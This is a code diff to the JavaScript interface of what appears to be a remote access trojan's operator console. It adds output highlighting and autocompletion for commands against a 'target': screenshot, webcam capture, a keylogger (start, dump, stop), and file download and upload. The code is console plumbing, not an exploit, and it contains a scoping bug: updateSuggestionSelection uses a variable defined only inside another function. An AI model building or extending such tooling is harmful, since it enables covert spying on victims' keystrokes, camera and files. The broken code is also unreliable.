@@ -401,7 +401,27 @@ function formatOutput(output) {
     if (typeof output !== 'string') {
         output = JSON.stringify(output, null, 2);
     }
-    return escapeHtml(output).replace(/\n/g, '<br>');
+    
+    // Escape HTML
+    output = escapeHtml(output);
+    
+    // Highlight commands
+    output = output.replace(/^(\$|\>)\s+(.+)$/gm, (match, prompt, cmd) => {
+        return `<span class="prompt">${prompt}</span> <span class="command">${highlightCommand(cmd)}</span>`;
+    });
+    
+    // Highlight paths and URLs
+    output = output.replace(/(?:^|\s)(\/[\w\-./]+)/g, ' <span class="path">$1</span>');
+    output = output.replace(/(https?:\/\/[^\s]+)/g, '<span class="url">$1</span>');
+    
+    // Highlight IP addresses
+    output = output.replace(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/g, '<span class="ip">$1</span>');
+    
+    // Highlight success/error messages
+    output = output.replace(/^(Success|OK|Done):.+$/gm, '<span class="success">$&</span>');
+    output = output.replace(/^(Error|Failed|Warning):.+$/gm, '<span class="error">$&</span>');
+    
+    return output.replace(/\n/g, '<br>');
 }
 
 function escapeHtml(unsafe) {
@@ -832,4 +852,114 @@ style.textContent = `
     }
 `;
 
-document.head.appendChild(style); 
+document.head.appendChild(style);
+
+// Add command suggestions and auto-completion
+const commonCommands = [
+    { cmd: 'help', desc: 'Show available commands' },
+    { cmd: 'sysinfo', desc: 'Get system information' },
+    { cmd: 'screenshot', desc: 'Take screenshot' },
+    { cmd: 'webcam', desc: 'Capture webcam image' },
+    { cmd: 'keylog_start', desc: 'Start keylogger' },
+    { cmd: 'keylog_dump', desc: 'View keylogger data' },
+    { cmd: 'keylog_stop', desc: 'Stop keylogger' },
+    { cmd: 'download', desc: 'Download file from target' },
+    { cmd: 'upload', desc: 'Upload file to target' },
+    { cmd: 'cd', desc: 'Change directory' },
+    { cmd: 'pwd', desc: 'Print working directory' },
+    { cmd: 'quit', desc: 'Terminate session' }
+];
+
+function setupCommandInput(inputElement) {
+    const suggestionsBox = document.createElement('div');
+    suggestionsBox.className = 'command-suggestions';
+    inputElement.parentNode.appendChild(suggestionsBox);
+    
+    let currentSuggestionIndex = -1;
+    
+    inputElement.addEventListener('input', (e) => {
+        const input = e.target.value.toLowerCase();
+        if (!input) {
+            suggestionsBox.style.display = 'none';
+            return;
+        }
+        
+        const suggestions = commonCommands.filter(cmd => 
+            cmd.cmd.toLowerCase().startsWith(input)
+        );
+        
+        if (suggestions.length > 0) {
+            suggestionsBox.innerHTML = suggestions.map((cmd, index) => `
+                <div class="suggestion-item ${index === currentSuggestionIndex ? 'selected' : ''}" 
+                     data-command="${cmd.cmd}">
+                    <span class="suggestion-cmd">${cmd.cmd}</span>
+                    <span class="suggestion-desc">${cmd.desc}</span>
+                </div>
+            `).join('');
+            suggestionsBox.style.display = 'block';
+            
+            // Add click handlers
+            suggestionsBox.querySelectorAll('.suggestion-item').forEach(item => {
+                item.addEventListener('click', () => {
+                    inputElement.value = item.dataset.command + ' ';
+                    inputElement.focus();
+                    suggestionsBox.style.display = 'none';
+                });
+            });
+        } else {
+            suggestionsBox.style.display = 'none';
+        }
+    });
+    
+    // Handle keyboard navigation
+    inputElement.addEventListener('keydown', (e) => {
+        const suggestions = suggestionsBox.querySelectorAll('.suggestion-item');
+        if (!suggestions.length) return;
+        
+        if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            currentSuggestionIndex = Math.min(currentSuggestionIndex + 1, suggestions.length - 1);
+            updateSuggestionSelection(suggestions);
+        } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            currentSuggestionIndex = Math.max(currentSuggestionIndex - 1, 0);
+            updateSuggestionSelection(suggestions);
+        } else if (e.key === 'Tab') {
+            e.preventDefault();
+            if (currentSuggestionIndex >= 0) {
+                inputElement.value = suggestions[currentSuggestionIndex].dataset.command + ' ';
+            } else if (suggestions.length > 0) {
+                inputElement.value = suggestions[0].dataset.command + ' ';
+            }
+            suggestionsBox.style.display = 'none';
+        } else if (e.key === 'Escape') {
+            suggestionsBox.style.display = 'none';
+            currentSuggestionIndex = -1;
+        }
+    });
+    
+    // Hide suggestions when clicking outside
+    document.addEventListener('click', (e) => {
+        if (!e.target.closest('.command-input')) {
+            suggestionsBox.style.display = 'none';
+            currentSuggestionIndex = -1;
+        }
+    });
+}
+
+function updateSuggestionSelection(suggestions) {
+    suggestions.forEach((item, index) => {
+        item.classList.toggle('selected', index === currentSuggestionIndex);
+    });
+}
+
+function highlightCommand(cmd) {
+    const parts = cmd.split(' ');
+    const command = parts[0];
+    const args = parts.slice(1).join(' ');
+    
+    if (commonCommands.some(c => c.cmd === command)) {
+        return `<span class="cmd-name">${command}</span>${args ? ' ' + args : ''}`;
+    }
+    return cmd;
+} 
